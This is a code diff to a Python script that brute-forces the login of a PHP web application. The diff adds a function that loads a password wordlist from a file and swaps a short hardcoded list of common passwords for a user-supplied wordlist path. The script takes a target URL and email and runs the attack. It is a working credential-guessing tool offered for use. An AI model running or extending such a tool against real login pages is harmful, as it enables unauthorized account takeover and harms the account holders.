@@ -1,5 +1,23 @@
 import requests
 
+def load_passwords(file_path):
+    """
+    Load a list of passwords from a file.
+
+    Parameters:
+    file_path (str): The path to the file containing the passwords.
+
+    Returns:
+    list: A list of passwords.
+    """
+    try:
+        with open(file_path, 'r', encoding='utf-8') as file:
+            passwords = file.read().splitlines()
+    except UnicodeDecodeError:
+        with open(file_path, 'r', encoding='latin-1') as file:
+            passwords = file.read().splitlines()
+    return passwords
+
 def brute_force_login(url, email, password_list):
     """
     Attempts to brute force the login for a given email using a list of passwords.
@@ -30,16 +48,7 @@ def brute_force_login(url, email, password_list):
 if __name__ == "__main__":
     url = input("Enter the login URL of the PHP application (e.g., http://example.com/login.php): ")
     email = input("Enter the email to brute force: ")
-    
-    # Example password list, replace with a more comprehensive list as needed
-    password_list = [
-        'password1',
-        'password123',
-        'admin',
-        'letmein',
-        '123456',
-        'password',
-        'realpassword'
-    ]
+    password_file = input("Enter the path to the password file (e.g., passwords.txt): ")
 
+    password_list = load_passwords(password_file)
     brute_force_login(url, email, password_list)
